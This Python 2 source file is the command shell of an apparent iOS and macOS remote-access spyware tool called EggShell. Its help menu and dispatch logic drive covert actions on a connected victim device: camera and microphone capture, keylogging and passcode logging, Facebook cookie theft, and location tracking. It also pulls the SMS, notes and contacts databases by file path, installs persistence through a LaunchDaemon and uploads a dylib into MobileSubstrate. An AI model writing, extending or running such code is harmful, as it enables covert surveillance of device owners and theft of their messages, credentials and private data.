#ESShell
#created by lucas.py
#3-5-17
import os
import sys
from src.helper.helper import Helper

class ESShell:
    localCMDS = ["alert","installpro"]
    def __init__(self):
        self.iswin = sys.platform.startswith('win')
        self.CMD_CLEAR = 'cls' if self.iswin else 'clear'
        self.CMD_LS = 'dir' if self.iswin else 'ls'
        self.CMD_PWD = 'cd' if self.iswin else 'pwd'
        self.h = Helper()
    
    def showHelp(self,CDA,multisession):
        def showCommand(cmd,desc):
            print cmd + " " * (15 - len(cmd)) + ": " + desc
        print "\n"+self.h.WHITEBU+"Local Commands:"+"\n"+self.h.ENDC
        if multisession:
            showCommand("back", "detach from session")
            showCommand("exit", "detach and close session")
        showCommand("lls","list contents of local directory")
        showCommand("lcd","change local directories")
        showCommand("lpwd","get current local directory")
        showCommand("lopen","open local directory")
        showCommand("clear","clears terminal")
        print ""
        if "i386" in CDA:
            print self.h.WHITEBU+"OS X Commands:"+"\n"+self.h.ENDC
            showCommand("ls","list contents of directory")
            showCommand("cd","change directories")
            showCommand("rm","delete file")
            showCommand("pwd","get current directory")
            showCommand("download","download file")
            showCommand("picture","take picture through iSight camera")
            showCommand("getpid","get process id")
            showCommand("openurl","open url through the default browser")
            showCommand("idletime","get the amount of time since the keyboard/cursor were touched")
            showCommand("getpaste","get pasteboard contents")
            showCommand("mic","record microphone")
            showCommand("brightness","adjust screen brightness")
            showCommand("getfacebook","attempt to retrieve facebook cookie")
            showCommand("exec","execute command")
            showCommand("encrypt","encrypt file")
            showCommand("decrypt","decrypt file")
            showCommand("persistence","attempts to connect back every 60 seconds")
            showCommand("rmpersistence","removes persistence")
            print ""
        if "arm" in CDA:
            print self.h.WHITEBU+"iOS Commands:"+"\n"+self.h.ENDC
            showCommand("sysinfo","get system information")
            showCommand("ls","list contents of directory")
            showCommand("cd","change directories")
            showCommand("rm","delete file")
            showCommand("pwd","get current directory")
            showCommand("download","download file")
            showCommand("frontcam","take picture through front camera")
            showCommand("backcam","take picture through back camera")
            showCommand("mic","record microphone")
            showCommand("getpid","get process id")
            showCommand("vibrate","make device vibrate")
            showCommand("alert","make alert show up on device")
            showCommand("say","make device speak")
            showCommand("locate","get device location")
            showCommand("respring","respring device")
            showCommand("setvol","set mediaplayer volume")
            showCommand("getvol","view mediaplayer volume")
            showCommand("isplaying","view mediaplayer info")
            showCommand("openurl","open url on device")
            showCommand("dial","dial number on device")
            showCommand("getsms","download sms database")
            showCommand("getnotes","download notes database")
            showCommand("getcontacts","download addressbook")
            showCommand("battery","get battery level")
            showCommand("lastapp","get bundle id of last app opened")
            showCommand("listapps","list bundle identifiers")
            showCommand("open","open app")
            showCommand("persistence","installs LaunchDaemon - tries to connect every 30 seconds")
            showCommand("rmpersistence","uninstalls LaunchDaemon")
            showCommand("installpro","installs eggshellpro to device")
            print "\n"+self.h.WHITEBU+"eggshellPro Commands:"+"\n"+self.h.ENDC
            showCommand("lock","simulate lock button press")
            showCommand("wake","wake device from sleeping state")
            showCommand("home","simulate home button press")
            showCommand("doublehome","simulate home button double press")
            showCommand("play","plays music")
            showCommand("pause","pause music")
            showCommand("next","next track")
            showCommand("prev","previous track")
            showCommand("togglemute","programatically toggles silence switch")
            showCommand("ismuted","check if we are silenced or not")
            showCommand("islocked","check if device is locked") #there are ways to get around this, (alwaysunlock) tweak
            showCommand("getpasscode","log successfull passcode attempts")
            showCommand("unlock","unlock with passcode") #there are ways to get around this, (alwaysunlock) tweak
            showCommand("keylog","log keystrokes") #not working inside apps...yet
            showCommand("keylogclear","clear keylog data")
            showCommand("locationservice","turn on or off location services")
            print ""
    
    def interact(self,session,server,multisession=0):
        self.h.strinfo("type \"help\" for commands")
        iosshortcuts = {
            "getsms":"download /var/mobile/Library/SMS/sms.db",
            "getnotes":"download /var/mobile/Library/Notes/notes.sqlite",
            "getcontacts":"download /var/mobile/Library/AddressBook/AddressBook.sqlitedb"
        }
        while 1:
            try:
                command = raw_input(session.name)
            except KeyboardInterrupt:
                print ""
                return -1
            args = command.split()
            try: #fixed crash if you type " "
                v = args[0]
            except:
                continue
            if not command:
                continue
            #exclusive commands
            if "arm" in session.CDA:
                if args[0] == "alert":
                    title = bben(raw_input("Set title: "))
                    message = bben(raw_input("Set message: "))
                    server.sendCommand(args[0] + " " + title + " " + message,session.conn)
                    continue
                elif args[0] in iosshortcuts:
                    if iosshortcuts[args[0]].split()[0] == "download":
                        server.downloadFile(iosshortcuts[args[0]],session.conn)
                    else:
                        server.sendCommand(iosshortcuts[args[0]],session.conn)
                    continue
                elif args[0] == "installpro":
                    server.uploadFile("src/binaries/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/nespro.dylib",session.conn)
                    continue
                elif args[0] == "frontcam" or args[0] == "backcam":
                    server.downloadFile(command,session.conn)
                    continue
            elif "i386" in session.CDA:
                if args[0] == "picture" or args[0] == "screenshot":
                    server.downloadFile(command,session.conn)
                    continue
            #mutually exclusive
            if args[0] == "help":
                self.showHelp(session.CDA,multisession)
            elif args[0] == "download" or (args[0] == "mic" and len(args) >= 2 and args[1] == "stop"):
                server.downloadFile(command,session.conn)
            elif args[0] == "clear":
                os.system(self.CMD_CLEAR);
            elif args[0] == "lopen":
                if len(command.split()) == 1:
                    print "Usage: lopen localdirectory"
                else:
                    if self.iswin:
                        print "Not supported on windows."
                    else:
                        os.system('open ' + command[5:])
            elif args[0] == "lls":
                os.system(self.CMD_LS + " " + command[len(self.CMD_LS)+1:])
            elif args[0] == "lcd":
                if len(command.split()) == 1:
                    print "Usage: lcd localdirectory"
                else:
                    try:
                        os.chdir(command.split()[1])
                    except:
                        self.h.strinfo("directory not found")
            elif args[0] == "lpwd":
                os.system(self.CMD_PWD)
            elif args[0] == "back" and multisession:
                return
            elif args[0] == "exit":
                return -1
            else:
                server.sendCommand(command,session.conn)

